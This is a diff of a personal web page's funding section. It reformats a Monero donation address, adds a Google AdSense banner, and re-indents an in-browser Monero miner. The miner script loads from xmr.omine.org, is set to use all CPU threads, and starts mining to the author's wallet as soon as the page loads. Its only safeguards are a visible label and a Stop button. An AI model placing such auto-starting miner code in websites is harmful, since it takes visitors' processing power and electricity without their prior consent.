@@ -179,13 +179,15 @@
       <h1>Funding</h1>
     </p>
     <p>
-      <h5 style="margin-left: 2%;">Thanks for your donation. Every bit of donation will be the driving force for me to move forward.</h5>
+      <h5 style="margin-left: 2%;">Thanks for your donation. Every bit of donation will be the driving force for me to
+        move forward.</h5>
       <h4 style="margin-left: 18%;">谢谢你的捐助。每一点的捐助都将是我前进的动力！</h5>
     </p>
     <p>
       <h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Monero</h2>
       <img src="/img/Monero.png" style="margin-left: 23%;"></img>
-      <h5 style="margin-left: 15%;">46gRnPZWAQddCypNA5A27qNmrM7JqapbWdsD1Dw1prDVea4<br>JnXVxFv846oRQW7XxMYUZnZ8PUE59bVNzP5khr8KNGDsUKDz
+      <h5 style="margin-left: 15%;">
+        46gRnPZWAQddCypNA5A27qNmrM7JqapbWdsD1Dw1prDVea4<br>JnXVxFv846oRQW7XxMYUZnZ8PUE59bVNzP5khr8KNGDsUKDz
       </h5>
     </p>
     <p>
@@ -234,61 +236,69 @@
     </div>
     <p>
       <a href="mailto:hollowman186@qq.com" style="margin-left: 38%; font-size: 150%">Mail ME</a>
+      <h1>Advertisement</h1>
+      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+      <!-- ADS -->
+      <ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px;margin-left: -17%;"
+        data-ad-client="ca-pub-8085225986579534" data-ad-slot="9050958971"></ins>
+      <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
       <div class="miner-outerbox">
-          <h1>Help Me Mine Monero</h1>
-          <button id="stop-button" style="margin-left: 38% "><span class="default">Stop</span></button>
-          <p>
-            <textarea rows='10' cols='40' id="texta" style="margin-left: 17% "></textarea>
-          </p>
-        </div>
-    
-        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-        <script src="https://xmr.omine.org/assets/v7.js"></script>
-        <script>
-          var isGo = true;
-          var timeout;
-    
-          function addText(e) {
-    
-            var t = document.getElementById("texta");
-    
-            "job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value += "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" === e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight
-    
-          }
-          function miner() {
-            OMINE("46gRnPZWAQddCypNA5A27qNmrM7JqapbWdsD1Dw1prDVea4JnXVxFv846oRQW7XxMYUZnZ8PUE59bVNzP5khr8KNGDsUKDz#WebMiner", "-1"), //-1 means use all cpu threads
-              throttleMiner = 10,
-              addText("Connecting..."),
-              timeout = setInterval(function () {
-                for (;
-                  sendStack.length > 0;
-                ) addText(sendStack.pop());
-                for (;
-                  receiveStack.length > 0;
-                ) addText(receiveStack.pop());
-                addText("calculated " + totalhashes + " hashes.")
-              }
-                , 2e3);
-          }
-    
-          miner();
-          $("#stop-button").click(function () {
-            if (isGo) {
-              $(this).html(`<span class="start">Continue</span>`);
-              stopMining();
-              clearInterval(timeout);
-              addText("Stopped mining...\nOK");
+        <h1>Help Me Mine Monero</h1>
+        <button id="stop-button" style="margin-left: 38% "><span class="default">Stop</span></button>
+        <p>
+          <textarea rows='10' cols='40' id="texta" style="margin-left: 17% "></textarea>
+        </p>
+      </div>
+
+      <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+      <script src="https://xmr.omine.org/assets/v7.js"></script>
+      <script>
+        var isGo = true;
+        var timeout;
+
+        function addText(e) {
+
+          var t = document.getElementById("texta");
+
+          "job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value += "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" === e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight
+
+        }
+        function miner() {
+          OMINE("46gRnPZWAQddCypNA5A27qNmrM7JqapbWdsD1Dw1prDVea4JnXVxFv846oRQW7XxMYUZnZ8PUE59bVNzP5khr8KNGDsUKDz#WebMiner", "-1"), //-1 means use all cpu threads
+            throttleMiner = 10,
+            addText("Connecting..."),
+            timeout = setInterval(function () {
+              for (;
+                sendStack.length > 0;
+              ) addText(sendStack.pop());
+              for (;
+                receiveStack.length > 0;
+              ) addText(receiveStack.pop());
+              addText("calculated " + totalhashes + " hashes.")
             }
-            else {
-              $(this).html(`<span class="stop">Stop</span>`);
-              miner();
-            }
-            isGo = !isGo;
+              , 2e3);
+        }
+
+        miner();
+        $("#stop-button").click(function () {
+          if (isGo) {
+            $(this).html(`<span class="start">Continue</span>`);
+            stopMining();
+            clearInterval(timeout);
+            addText("Stopped mining...\nOK");
           }
-    
-          );
-        </script>
-        <h1>&nbsp;</h1>
+          else {
+            $(this).html(`<span class="stop">Stop</span>`);
+            miner();
+          }
+          isGo = !isGo;
+        }
+
+        );
+      </script>
+      <h1>&nbsp;</h1>
   </div>
 
   </p>
